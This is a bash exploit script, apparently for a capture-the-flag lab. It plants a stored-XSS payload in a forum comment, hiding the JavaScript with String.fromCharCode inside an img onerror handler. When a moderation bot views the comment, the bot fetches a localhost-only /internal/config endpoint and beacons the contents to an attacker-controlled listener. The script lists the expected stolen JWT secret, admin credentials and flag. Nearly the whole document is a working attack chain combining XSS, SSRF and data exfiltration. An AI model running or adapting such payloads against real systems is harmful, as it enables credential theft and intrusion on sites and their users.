#!/usr/bin/env bash
# Breach: stored-xss-bot-ssrf
# Turns the moderation bot into an SSRF proxy via a stored-XSS fetch-and-relay
# payload; the bot reads localhost-only /internal/config and beacons the body.
# Usage: ./ssrf-relay.sh <base_url> <cookie_jar> <listener_host:port> [<thread_id>] (default: bbeo32ucx0a65b8)
set -euo pipefail
BASE="${1:-http://localhost:4942}"
JAR="${2:-cookies_jdoe.txt}"
LISTENER="${3:-127.0.0.1:8888}"
THREAD="${4:-bbeo32ucx0a65b8}"

# JS payload: fetch /internal/config (bot's browser is same-origin on the
# server host, so the localhost-only gate passes), beacon the body out.
# String.fromCharCode is used for the URLs to stay quote-safe in the attr.
JS="var C='http://${LISTENER}/config?d=';fetch('/internal/config').then(r=>r.text()).then(t=>{new Image().src=C+encodeURIComponent(t)})"

# Encode JS as fromCharCode() digits so the attribute needs no inner quotes.
CODES=$(python3 - "$JS" <<'PY'
import sys
js = sys.argv[1]
print(','.join(str(ord(c)) for c in js))
PY
)
PAYLOAD="<img src=x onerror=\"eval(String.fromCharCode(${CODES}))\">"

echo "[*] Posting SSRF-relay payload to $BASE/forum/$THREAD/comment"
curl -s -b "$JAR" -X POST "$BASE/forum/$THREAD/comment" \
  --data-urlencode "content=$PAYLOAD" -o /dev/null -w "status=%{http_code}\n"

echo "[*] Waiting for the moderation bot (cadence ~1-2 min)..."
echo "[*] Watch the listener log for:  GET /config?d=%7B%22jwt_secret%22..."
echo "[*] Expected exfil: {\"jwt_secret\":\"42network\",\"pb_admin_email\":"
echo "    \"admin@42network.local\",\"pb_admin_password\":\"Darkly42Admin!\","
echo "    ...,\"darkly_flag\":\"FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}\"}"
